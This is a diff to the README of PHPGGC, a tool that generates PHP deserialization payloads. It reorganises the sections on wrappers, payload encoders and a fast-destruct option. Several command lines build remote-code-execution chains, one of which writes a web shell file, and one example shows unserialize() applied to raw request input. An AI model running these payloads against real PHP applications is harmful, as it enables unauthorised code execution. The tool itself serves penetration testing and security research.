@@ -82,23 +82,23 @@ $ ./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
 O:13:"Swift_Message":8:{...}
 ```
 
-Arguments allow to modify the way the payload is output. For instance, `-u` will URL encode it, and `-b` will convert it to base64.
-Payloads often contain NULL bytes and cannot be copy/pasted as-is. Use `-s` for a soft URL encode, which keeps the payload readable.
+## Wrapper
 
 The `-w` option allows you to define a PHP file containing a `wrapper($chain)` function.
 This will be called after the chain is built, but before the `serialize()`, in order to adjust the payload's shape.
 For instance, if the vulnerable code looks like this:
 
-```
+```php
+<?php
 $data = unserialize($_GET['data']);
 print $data['message'];
 ```
 
 You could use a __toString() chain, wrapping it like so:
 
-```
+```php
+<?php
 # /tmp/my_wrapper.php
-
 function wrapper($chain)
 {
     return array(
@@ -114,7 +114,18 @@ $ ./phpggc -w /tmp/my_wrapper.php slim/rce1 system id
 a:1:{s:7:"message";O:18:"Slim\Http\Response":2:{...}}
 ```
 
-## Contributing
+## Encoders
+
+Arguments allow to modify the way the payload is output. For instance, `-u` will URL encode it, and `-b` will convert it to base64.
+Payloads often contain NULL bytes and cannot be copy/pasted as-is. Use `-s` for a soft URL encode, which keeps the payload readable.
+
+The encoders can be chained, and as such the order is important. For instance, `./phpggc -b -u -u slim/rce1 system id` will base64 the payload, then URLencode it twice.
+
+## Advanced: Fast destruct
+
+PHPGGC implements a `--fast-destruct` flag, that will unsure your serialized object will be destroyed right after the `unserialize()` call, and not at the end of the script. *I'd recommend using it for every `__destruct` vector, as it improves reliability*. For instance, if PHP script raises an exception after the call, the `__destruct` method of your object might not be called.
+
+# Contributing
 
 Pull requests are more than welcome. Please follow these simple guidelines:
 
